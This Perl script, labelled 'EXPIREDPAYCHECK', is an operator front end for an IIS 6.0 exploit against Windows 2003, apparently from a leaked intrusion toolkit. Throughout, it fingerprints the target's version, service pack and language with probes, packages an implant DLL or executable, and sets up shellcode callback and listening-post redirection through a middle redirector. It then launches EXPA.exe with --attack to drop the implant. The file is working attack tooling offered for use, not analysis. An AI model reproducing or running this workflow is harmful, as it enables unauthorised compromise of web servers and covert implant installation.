


use strict;
use vars qw($VERSION);

$::VERSION = "EXPIREDPAYCHECK Script: 1.0.0";
print "\n\n$::VERSION\n\n";



use FindBin;				
use lib "$FindBin::Bin";	
use Getopt::Long;			
use Cwd;					

use lib "$FindBin::Bin\\..\\..\\Resources\\Perl";
use ExploitUtils qw(
	$EU_LOGFILE
	$EU_VERBOSE
	$EU_BATCHMODE
	EU_LogInit
	EU_Log
	EU_ExitMessage
	EU_GetInput
	EU_GetExistingDir
	EU_GetIP
	EU_GetLocalIP
	EU_GetRootDir
	EU_GetPort
	EU_RunCommand
	EU_GetAddr
);


use vars qw($RIDEAREA $PAYLOAD_DLL $PAYLOAD_EXE $EXPLOIT_EXE @DEPFILES);

my	%opts = ();
GetOptions(\%opts, "v", "h", "q|?", "b", "e=s", "f=s", "d=s", "t=s", "l=s", "c=s", "x=s", "n=s") or &print_script_usage(0);

if (scalar(@ARGV) > 0 ) {
  &EU_Log(1, "Extraneous arguments found on command line: @ARGV");
  &EU_Log(1, "Arguments will be ingnored");
  while(@ARGV) {shift;}
}

if (!defined($opts{"e"})) {
	&EU_Log(1, "A -e option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"f"})) {
	&EU_Log(1, "A -f option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"x"})) {
	&EU_Log(1, "A -x option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"l"})) {
	&EU_Log(1, "A -l option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"n"})) {
	&EU_Log(1, "A -n option must be supplied.");
	&print_usage(0);
}

$::RIDEAREA		= "Resources\\Tools\\ridearea2.exe";	
$::RPCTOUCHII	= "Resources\\Tools\\rpc2.exe";			

$::LP_DLL	= "$opts{l}";					
$::PAYLOAD_DLL	= "$opts{f}";				
$::PAYLOAD_EXE	= "$opts{x}";				
$::PAYLOAD_EXE_NAME = "$opts{n}";				
$::EXPLOIT_EXE	= "$opts{e}\\EXPA.exe";			

$::EGG_SOCKET_NONE		= "1";			
$::EGG_SOCKET_NEW			= "2";			
$::EGG_SOCKET_REUSE		= "3";			

$::IMPLANT_SOCKET_NEW		= "2";			
$::IMPLANT_SOCKET_MAINTAIN	= "3";			

$::RUN_EXPLOIT				= "1";			
$::RUN_PROBE_1				= "2";			
$::RUN_PROBE_2				= "3";			
$::RUN_PROBE_3				= "4";			
$::RUN_PROBE_4				= "5";			
$::RUN_PROBE_5				= "6";			

my $work_dir       = $opts{"d"} if (defined $opts{"d"});
my $root_dir       = $opts{"c"} if (defined $opts{"c"});
my $TargetIpIn      = $opts{"t"} if (defined $opts{"t"});


@DEPFILES = ($::RIDEAREA, $::EXPLOIT_EXE);

my	$logfile_prefix		= "EXPA_";		
my	$logfile_suffix		= "_script.log";	
my	$filename_suffix	= "_payload.bin";		

my	$TargetIp			= $TargetIpIn;		
my	$TargetPort			= 80;				
my	$ImplantSocketStatus= $::IMPLANT_SOCKET_NEW;	
my	$TimeOutValue		= 0;				

my	$PayloadFile		= "";				
my	$PayloadType		= "";				
my	$PayloadDropName		= "N/A";			

my	$EggSocketStatus		= $::EGG_SOCKET_NEW;	
my    $EggCallbackIp		= "127.0.0.1";		
my    $EggCallbackPort		= 0;				

my	$ExternalRideArea	= 0;				
my	$RA_Payload			= "N/A";

my $TransProt_none		=0;
my $TransProt_tcp		=1;
my $TransProt_udp		=2;
my $TargetTransportProtocol	= $TransProt_none;		
my $TransportProtocol 		= "undefined";

my $AppProt_none		= 0;
my $AppProt_NA		= 1;
my $AppProt_nbt		= 2;
my $AppProt_smb		= 3;
my $AppProt_smtp		= 4;
my $AppProt_pop		= 5;
my $AppProt_http		= 6;
my $AppProt_ftp		= 7;
my $AppProt_telnet	= 8;
my $AppProt_imap		= 9;
my $TargetApplicationProtocol = $AppProt_none;	
my $ApplicationProtocol	= "undefined";	

my $RpcConnection =  "";				

my $hostname;
my $IISver		= 0;
my $language	= "na";
my $http_path;
my $sslFlag 	= 0;
my $servicePack	= 0;
my $redirectPort= 0;

my $answer;
my $retcode;
&print_usage(1) if (defined $opts{"h"});	
&print_usage(0) if (defined $opts{"q"});	

$ExploitUtils::EU_VERBOSE   = 1 if (defined $opts{"v"});	
$ExploitUtils::EU_BATCHMODE = 1 if (defined $opts{"b"});	



if ($ENV{"OS"} ne "Windows_NT") {
    &EU_ExitMessage(1,"This script requires Windows NT or Windows 2000");
}


$work_dir = &EU_GetExistingDir("Enter pathname for operation's working directory", $work_dir, 1);
$root_dir = &EU_GetRootDir($root_dir,@::DEPFILES);



&EU_LogInit($logfile_prefix, $logfile_suffix, $work_dir);
&EU_Log(0,"$::VERSION");



&EU_Log(0,"\nChanging to working directory: $work_dir");
chdir $work_dir || &EU_ExitMessage(1,"Unable to change to working directory: $work_dir");



($TargetIp, $TargetPort, $EggSocketStatus, $ImplantSocketStatus, $PayloadFile, $PayloadType, $PayloadDropName, $TimeOutValue,
 $TargetTransportProtocol, $TargetApplicationProtocol, $RpcConnection, $ExternalRideArea, $hostname, $IISver, $language, $http_path, $sslFlag, 
 $servicePack, $EggCallbackIp, $EggCallbackPort, $redirectPort) =
	&validate_parms($work_dir, $root_dir, $TargetIp, $TargetPort, $EggSocketStatus, $ImplantSocketStatus, $PayloadFile, $PayloadType, $PayloadDropName,
	$TimeOutValue, $TargetTransportProtocol, $TargetApplicationProtocol, $RpcConnection, $ExternalRideArea);

my $flags = "";
if ($sslFlag) {
  $flags = " --ssl";
}

$retcode = &EU_GetInput("\nDo you want to probe the target ([y],n)? ", "y");
if( ($retcode eq "y") or ($retcode eq "yes") or ($retcode eq "Y") or ($retcode eq "YES") ) { 
	&EU_RunCommand("\"$root_dir\\$::EXPLOIT_EXE\" -t $TargetIp:$TargetPort -h $hostname --query $flags");
}


if(!$EU_BATCHMODE) {
	$answer = &EU_GetInput("\nReady to begin exploit ([y],n,quit)? ", "y");
	&EU_ExitMessage(0,"User terminated script")  if ($answer ne "y" and $answer ne "Y");
}


if ($ExternalRideArea == 1) {

	my $payload_name_format = "${work_dir}\\${logfile_prefix}%04d%02d%02d_%02d%02d%02d${filename_suffix}"; 
	my ($sec, $min, $hour, $mday, $mon, $year, $wday, $yday, $isdst) = gmtime(time);

	$year += 1900;
	$mon  += 1;

	$RA_Payload = sprintf($payload_name_format,$year,$mon,$mday,$hour,$min,$sec);

	&EU_Log(1,"\nInvoking RideArea");
	if( $ImplantSocketStatus eq $::IMPLANT_SOCKET_NEW ) {
		if ($PayloadDropName eq "N/A") {
			if ($PayloadType eq "d") {
				&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -o \"$RA_Payload\" -f 13 -a 3 -t s -l m");
			}
			else {
				&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -o \"$RA_Payload\" -f 13 -a 3 -t s");
			}
		}
		else {
			if ($PayloadType eq "d") {
				&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -d $PayloadDropName -o \"$RA_Payload\" -f 13 -a 3 -t s -l m");	
			}
			else {
				&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -d $PayloadDropName -o \"$RA_Payload\" -f 13 -a 3 -t s");	
			}
		}
	}
	if( $ImplantSocketStatus eq $::IMPLANT_SOCKET_MAINTAIN ) {
		if ($PayloadDropName eq "N/A") {
			if ($PayloadType eq "d") {
				&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -o \"$RA_Payload\" -f 17 -a 8 -t s -l m");
			}
			else {
				&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -o \"$RA_Payload\" -f 17 -a 8 -t s");
			}
		}
		else {
			if ($PayloadType eq "d") {
				&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -d $PayloadDropName -o \"$RA_Payload\" -f 17 -a 8 -t s -l m");	
			}
			else {
				&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -d $PayloadDropName -o \"$RA_Payload\" -f 17 -a 8 -t s");	
			}
		}
	}

	
}



&EU_Log(1,"\nExploit will launch in a separate window. Follow the status messages");
&EU_Log(1,"in the new window to determine if it succeeds.");
&EU_Log(1,"\nLaunching exploit...");


my $ImplantPayload = "N/A";
if ($ExternalRideArea == 1) {
	$ImplantPayload = $RA_Payload;
}
else {
	$ImplantPayload = $PayloadFile;
}

if ($ExternalRideArea == 1) {
	if ($redirectPort) {
	&EU_RunCommand("start \"EXPA Exploit\" cmd /T:9F /K \"\"$root_dir\\$::EXPLOIT_EXE\" $flags -t $TargetIp:$TargetPort -h $hostname -f \"$ImplantPayload\" -l \"$root_dir\\$::LP_DLL\" --attack --ver $IISver --sp $servicePack --lang $language --sc-connect $EggCallbackIp:$EggCallbackPort -c $redirectPort\"");
	}
	else {
	&EU_RunCommand("start \"EXPA Exploit\" cmd /T:9F /K \"\"$root_dir\\$::EXPLOIT_EXE\" $flags -t $TargetIp:$TargetPort -h $hostname -f \"$ImplantPayload\" -l \"$root_dir\\$::LP_DLL\" --attack --ver $IISver --sp $servicePack --lang $language --sc-connect $EggCallbackIp:$EggCallbackPort\"");
	}
	
}
else {
	&EU_ExitMessage(0,"\nError: RideArea was not invoked - exploit doesn't know how to handle this.");
}



my $cur_dir = cwd();
chdir $cur_dir || &EU_ExitMessage(1,"Unable to switch back to initial directory: $cur_dir");

&EU_ExitMessage(0,"\nDone with $::0.");


sub print_usage() {
	my ($verbose) = @_;
	print "$::VERSION\n";

	print qq~
Usage: $::0 [-v] [-h] [-?] [-b]
             [-d <working directory>] [-e <exploits directory>]
			 [-t <target IP>] [-l <lp dll>]
             [-f <payload dll>] 
			 [-x <payload exe> [-n <Payload Dropname>]]
	 
~;
	if ($verbose) {
		print qq~
  -v                    verbose mode. Default non-verbose mode.
  -h                    Print this help information.
  -?                    Print abbreviated help information.
  -b                    Batch (non-interactive) mode. Default interactive mode.
  -d <working directory> Working Directory
                        Top-level directory where operation's files will be
                        generated. Default E:\.
  -e <exploits directory> Exploits Directory
                        Top-level directory containing exploit files.
						Default one directory up from directory containing this script.
  -t <target IP>        Target IP address.
                        Default derived as last part of working directory name.
  -l <lp dll>           Filename of the listening post dll.
  -f <payload dll>      Filename of the implant payload (dll).
  -x <payload exe>      Filename of the implant payload (exe).
  -n <payload dropname> Filename to be used for the dropped executable 
~;
	}

	&EU_ExitMessage(1,"End of help.");
}


sub validate_parms() {
	my ($work_dir, $root_dir, $TargetIp, $TargetPort, $EggSocketStatus, $ImplantSocketStatus, $PayloadFile, $PayloadType, $PayloadDropName,
	$TimeOutValue, $TargetTransportProtocol, $TargetApplicationProtocol, $RpcConnection, $ExternalRideArea) = @_;

	my ($continue, $retcode, $vol, $dir);
	my ($redirectFlag);
	my $OrgTargetIp			= $TargetIp;
	my $LPRedirectionIp		= "127.0.0.1";
	my $LPRedirectionPort		= "undefined";
	my $DestinationIp			= $TargetIp;
	my $DestinationPort		= "undefined";
	my $TransportProtocolSelected = 0;
	my $RideAreaOpt			= "Exploit called";

	my ($LocalIp);

	my $EggCallbackIp;
	my $EggCallbackPort;

	my $RpcTouchProtocol			= "undefined";

	my $hostname;
	my $http_path	= "default";
	my $sslFlag 	= 0;
	my $servicePack	= 0;	
	my $language	= "na";
	my $IISver		= 0;
	my $redirectPort = 0;

	my $lang		= "";
	

	while (1) {


		&EU_Log(1,"\nSelect Payload file to send:\n");
		&EU_Log(1,"   0) $::PAYLOAD_DLL");		
		&EU_Log(1,"   1) $::PAYLOAD_EXE ($::PAYLOAD_EXE_NAME)");		
		while(1) {
			$retcode = &EU_GetInput("\nEnter selection [0]: ", "0");
			&EU_Log(0, "\nEnter selection [0]: $retcode");

			if($retcode eq "0") {
				&EU_Log(1,"\nUsing Payload file $::PAYLOAD_DLL\n");
				$PayloadFile = $::PAYLOAD_DLL;
				$PayloadType = "d";
				$PayloadDropName = "N/A";
			}
			elsif($retcode eq "1") { 
				&EU_Log(1,"\nUsing Payload file $::PAYLOAD_EXE\n");
				$PayloadFile = $::PAYLOAD_EXE;
				$PayloadType = "e";
				$PayloadDropName = $::PAYLOAD_EXE_NAME;
			}
			else {
				&EU_Log(1, "Invalid option. Try again or enter 'quit'.");
				next;
			}
			last;
		} 



		&EU_Log(1,"\nRideArea option:\n");
		&EU_Log(1,"   0) Have the script call RideArea. [DEFAULT]");		
		while(1) {
			$ExternalRideArea = &EU_GetInput("\nEnter selection [0]: ", $ExternalRideArea);
			&EU_Log(0, "\nEnter selection [0]: $ExternalRideArea");

			if($ExternalRideArea eq "0") {
				$RideAreaOpt = "Script called";
				$ExternalRideArea = 1;
			}
			else {
				&EU_Log(1, "Invalid option. Try again or enter 'quit'.");
				next;
			}
			last;
		} 

		$retcode = &EU_GetInput("\nSend exploit using SSL (port 443 open) (y,[n])? ", "n");
		if( ($retcode eq "y") or ($retcode eq "yes") or ($retcode eq "Y") or ($retcode eq "YES") ) { 
			$sslFlag = 1; 
			$DestinationPort = 443;
		}
		else { $sslFlag = 0; }
		my $flags = "";
		if ($sslFlag) {
			$flags = " --ssl";
		}
	
		$retcode = &EU_GetInput("\nWill this operation be REDIRECTED ([y],n)? ", "y");

		if( ($retcode eq "y") or ($retcode eq "yes") or ($retcode eq "Y") or ($retcode eq "YES") ) { $redirectFlag = 1; }
		else { $redirectFlag = 0; }



		if( $redirectFlag == 0 ) {


			$EggCallbackIp = $LocalIp;
			$TargetIp = $OrgTargetIp;  
			$TargetIp = &EU_GetIP("\nEnter the target IP Address", $TargetIp);
			&EU_Log(0, "Enter the target IP Address:  $TargetIp");
			$DestinationIp = $TargetIp;
			
			if ($DestinationPort eq "undefined") { 
				$DestinationPort = 80; 
			}
			$DestinationPort = &EU_GetPort("\nEnter the target Port", $DestinationPort);
			&EU_Log(0, "Enter the target Port:  $DestinationPort");

			$TargetPort = $DestinationPort;


			&EU_Log(1, "\nThe EXPA Exploit Payload must callback in order to upload the Implant Payload.");

			&EU_Log(1, "The local IP Address should be used as the Egg callback IP Address.");

			$EggCallbackIp = &EU_GetLocalIP("\nEnter the Egg callback IP Address", $LocalIp);
			&EU_Log(0, "Enter the Egg callback IP Address:  $EggCallbackIp");

			$EggCallbackPort = $DestinationPort * 10 + 1;
			while(1) {
				$EggCallbackPort = &EU_GetPort("\nEnter the Egg callback Port", $EggCallbackPort);
				&EU_Log(0, "Enter the Egg callback Port:  $EggCallbackPort");
				if($EggCallbackPort eq "0") {
					&EU_Log(1, "Invalid Port number. Try again or enter 'quit'.");
					next;
				}
				last;
			} 
			$EggSocketStatus = $::EGG_SOCKET_NEW

		}

		else {


			$LPRedirectionIp = &EU_GetIP("\nEnter the LP Redirection IP address", $LPRedirectionIp);
			&EU_Log(0, "Enter the LP Redirection IP address:  $LPRedirectionIp");
			$TargetIp = $LPRedirectionIp;

			$LPRedirectionPort = $DestinationPort * 10;
			$LPRedirectionPort = &EU_GetPort("TargetPort: $DestinationPort.  Enter the LP Redirection Port", $LPRedirectionPort);
			&EU_Log(0,"TargetPort:$TargetPort.  Enter the LP Redirection Port: $LPRedirectionPort");
			$TargetPort = $LPRedirectionPort;

			&EU_Log(1, "\n");
			&EU_Log(1, "*************************************************************************");
			&EU_Log(1, "* The EXPA Exploit Payload must callback in order to upload the Implant *");
			&EU_Log(1, "* Payload.  The callback IP Address MUST be that of the Middle          *");
			&EU_Log(1, "* Redirector.  The callback Port MUST be the same number on both the    *");
			&EU_Log(1, "* Middle Redirector and the local machine, else redirection will fail.  *");
			&EU_Log(1, "* The local machine uses this port to listen for the callback, and the  *");
			&EU_Log(1, "* EXPA Exploit Payload uses it to call back to the local machine        *");
			&EU_Log(1, "* through the Redirector.                                               *");
			&EU_Log(1, "*************************************************************************");

			$EggCallbackIp = &EU_GetLocalIP("\nEnter the Egg callback(Middle Redirector) IP ", $EggCallbackIp);
			&EU_Log(0, "Enter the Egg callback(Middle Redirector) IP Address:  $EggCallbackIp");

			$EggCallbackPort = $DestinationPort * 10 + 1;
			while(1) {
				$EggCallbackPort = &EU_GetPort("\nEnter the Egg callback Port", $EggCallbackPort);
				&EU_Log(0, "Enter the Egg callback Port:  $EggCallbackPort");
				if($EggCallbackPort eq "0") {
					&EU_Log(1, "Invalid Port number. Try again or enter 'quit'.");
					next;
				}
				last;
			} 


			$EggSocketStatus = $::EGG_SOCKET_NEW

		}


		$ImplantSocketStatus = $::IMPLANT_SOCKET_MAINTAIN;		
		&EU_Log(1,"\nImplant socket option set to MAINTAIN. Exploit will launch the listening post.");
		
	

		&EU_Log(1, "\nThe default time-out value for the target connection is 60 sec.");
		&EU_Log(1, "(You may want to increase this value if the network is exceptionally slow.)");
		$retcode = &EU_GetInput("Use default value of 60 sec ([y],n)? ", "y");
		&EU_Log(0, "Use default value of 60 sec ([y],n)?  $retcode");

		if( ($retcode eq "y") or ($retcode eq "yes") or ($retcode eq "Y") or ($retcode eq "YES") or ($retcode eq "60") ) {
			$TimeOutValue = "60";
		}
		else {
			$TimeOutValue = &EU_GetInput("Enter new time-out value (greater than 60): ");
			&EU_Log(0, "Enter new time-out value (greater than 60):  $TimeOutValue");
		}



		&EU_Log(1, "\nEnter the value to be used in the Host: HTTP header.");
		&EU_Log(1, "Type 'more' to see more info about what this value should be.");
		$hostname = &EU_GetInput("Host: header (default is the target's IP: $OrgTargetIp)? ", "IP");

		while ($hostname eq "more") {
			&EU_Log(1, "\nIn a default IIS installation, it doesn't matter what this field is, so long");
			&EU_Log(1, "as it contains only alphanumeric characters and is less than 256 bytes long.");
			&EU_Log(1, "For a machine hosting multiple sites, the name is important, and must match");
			&EU_Log(1, "one site's DNS name.  Firewalls and proxies may also examine this value.");
			&EU_Log(1, "\nA good heuristic is to do a reverse DNS lookup of the IP address and use that");
			&EU_Log(1, "as the Host: header.");
			$hostname = &EU_GetInput("(default is the target's IP)? ", "IP");
		}

		if ($hostname eq "IP") {
			$hostname = $OrgTargetIp;
		} 



		$http_path = &EU_GetInput("\nUrl path for the exploit to use? [$http_path] ", $http_path);

		&EU_Log(1, "\nAll web requests (including our probes) are logged by IIS.");
		$retcode = &EU_GetInput("\nProbe the target now to determine IIS version? ([y], n)?", "y");
		if ($retcode eq "y" or $retcode eq "Y") {
			&EU_RunCommand("\"$root_dir\\$::EXPLOIT_EXE\" -t $TargetIp:$TargetPort -h $hostname --query $flags");
		}

		$IISver = &EU_GetInput("\nEnter the IIS version [6]: ", 6);
		if ($IISver eq "6") {
			$IISver = 6;
		}
		else {
			&EU_ExitMessage(1,"Invalid IIS version. Only version 6 is currently supported.\n");
		}
		
		$retcode = &EU_GetInput("\nProbe the target now to determine service pack? ([y], n)?", "y");
		if ($retcode eq "y" or $retcode eq "Y") {
			&EU_Log(1,"\nService pack detection may require us to send up to 6 probes.");
			$retcode = &EU_GetInput("\nPlease specify the delay in seconds between probes [0]:", "0");
			if ( ($redirectFlag == 1 ) and ($retcode == 0) ) {
				&EU_Log(1, "\nDue to redirection, delay will be set to a minimum of 1.");
				&EU_Log(1, "\nIf using multiple redirection hops and detection fails, retry with a longer delay.");
				$retcode = 1;
			}
			&EU_RunCommand("\"$root_dir\\$::EXPLOIT_EXE\" -t $TargetIp:$TargetPort -h $hostname --ver $IISver --detect-sp --detect-delay $retcode $flags");
		}

		$servicePack = &EU_GetInput("\nEnter the service pack number [2]: ", 2);
		if ( (!($servicePack eq 2)) && (!($servicePack eq 1)) && (!($servicePack eq 0)) ){
			&EU_ExitMessage(1,"Invalid service pack level chosen.\n");
		}
		
		$retcode = &EU_GetInput("\nProbe the target now to determine language? ([y], n)?", "y");
		if ($retcode eq "y" or $retcode eq "Y") {
			&EU_Log(1,"\nLanguage detection may require us to send up to 19 semi-malicious probes.");
			$retcode = &EU_GetInput("\nPlease specify the delay in seconds between probes [0]:", "0");
			if ( ($redirectFlag == 1 ) and ($retcode == 0) ) {
				&EU_Log(1, "\nDue to redirection, delay will be set to a minimum of 1.");
				&EU_Log(1, "\nIf using multiple redirection hops and detection fails, retry with a longer delay.");
				$retcode = 1;
			}
			&EU_RunCommand("\"$root_dir\\$::EXPLOIT_EXE\" -t $TargetIp:$TargetPort -h $hostname --ver $IISver --sp $servicePack --detect-lang ALL --detect-delay $retcode $flags");
		}
		&EU_Log(1,"\nLanguage options:");
		&EU_Log(1,"     English - en");       
		&EU_Log(1,"     Chinese (Hong Kong) - zhhk    Japanese - ja");
		&EU_Log(1,"     Chinese (PRC) - zhcn          (Korean - ko - currently unsupported)"); 
		&EU_Log(1,"     Chinese (Taiwan)- zhtw        Polish - pl");
		&EU_Log(1,"     Czech - cs                    Portuguese - pt");
		&EU_Log(1,"     Dutch - nl                    Portuguese (Brazil) - ptbr");
		&EU_Log(1,"     French - fr                   Russian - ru ");  
		&EU_Log(1,"     German - de                   Spanish - es"); 
		&EU_Log(1,"     Hungarian - hu                Swedish - sv ");
		&EU_Log(1,"     Italian - it                  Turkish - tr ");
		$language = &EU_GetInput("\nEnter the language option [en]: ", "en");
		
		$retcode = 0;
		for $lang ("en", "zhhk", "zhcn", "zhtw", "cs", "nl", "fr", "de", "hu", "it", "ja", "pl", "pt", "ptbr", "ru", "es", "sv", "tr" ){
			if ($language eq $lang) {
				$retcode = 1;
			}
		}
		if ($retcode == 0) {
			&EU_ExitMessage(1,"Invalid language chosen.\n");
		}
		
		&EU_Log(1,"\nConfirm Network Parameters:");
		&EU_Log(1,"\tRoot Directory        : $root_dir");
		&EU_Log(1,"\tLocal IP              : $LocalIp");
		&EU_Log(1,"\tPayload file          : $PayloadFile");
		&EU_Log(1,"\tPayload drop name     : $PayloadDropName");
		&EU_Log(1,"\tRideArea Option       : $RideAreaOpt");
		if( $redirectFlag ) {
			&EU_Log(1,"\tUsing Redirection     : True");
			&EU_Log(1,"\tLP Redirector IP      : $LPRedirectionIp");
			&EU_Log(1,"\tLP Redirector Port    : $LPRedirectionPort");
		}
		else {
			&EU_Log(1,"\tUsing Redirection     : False");
		}
			&EU_Log(1,"\tTarget IP             : $DestinationIp");
			&EU_Log(1,"\tTarget Port           : $DestinationPort");

		if( $EggSocketStatus eq $::EGG_SOCKET_NEW ) {
			&EU_Log(1,"\tEgg Socket Status     : New");
			if( $redirectFlag ) {
				&EU_Log(1,"\tEgg Callback IP       : $EggCallbackIp (Middle Redirector)");
			}
			else {
				&EU_Log(1,"\tEgg Callback IP       : $EggCallbackIp");
			}
			&EU_Log(1,"\tEgg Callback Port     : $EggCallbackPort");
		}
		elsif( $EggSocketStatus eq $::EGG_SOCKET_REUSE ) {
			&EU_Log(1,"\tEgg Socket Status     : Reuse");
		}
		else {
			&EU_Log(1,"\tEgg Socket Status     : None");
		}

		if( $ImplantSocketStatus eq $::IMPLANT_SOCKET_MAINTAIN ) {
			&EU_Log(1,"\tExploit Socket Status : Maintain ");
			&EU_Log(1,"\t(Use existing connection for entire operation.)");
		}
		else {
			&EU_Log(1,"\tExploit Socket Status : Close ");
			&EU_Log(1,"\t(Existing connection NOT used for entire operation.)");
		}


		if ($IISver == 6) {
			&EU_Log(1,"\tTarget Platform       : Windows 2003 SP $servicePack (IIS 6.0)");
			&EU_Log(1,"\tLanguage              : $language");
		} 

		&EU_Log(1,"\tHostname              : $hostname");

		&EU_Log(1,"\tPath                  : $http_path");

		&EU_Log(1,"\tNetwork Time Out      : $TimeOutValue sec");
		
		$continue = &EU_GetInput("\nContinue with the current values ([y],n,quit)? ","y");
		&EU_Log(0, "\nContinue with the current values ([y],n,quit)? $continue");

		if( ($continue eq "y") or ($continue eq "yes") or ($continue eq "Y") or ($continue eq "YES") ) {
			last; 
		} 
		elsif( ($continue eq "q") or ($continue eq "quit") or ($continue eq "Q") or ($continue eq "QUIT") ) {
			&EU_ExitMessage(1,"User terminated script\n");
		}
		else {
			&EU_Log(1, "Returning to top of script...\n");
			next;
		}


	} 



	return ($TargetIp, $TargetPort, $EggSocketStatus, $ImplantSocketStatus, $PayloadFile, $PayloadType, $PayloadDropName, $TimeOutValue,
	        $TargetTransportProtocol, $TargetApplicationProtocol, $RpcConnection, $ExternalRideArea, $hostname, $IISver, $language, 
	        $http_path, $sslFlag, $servicePack, $EggCallbackIp, $EggCallbackPort, $redirectPort);
			
}


__END__



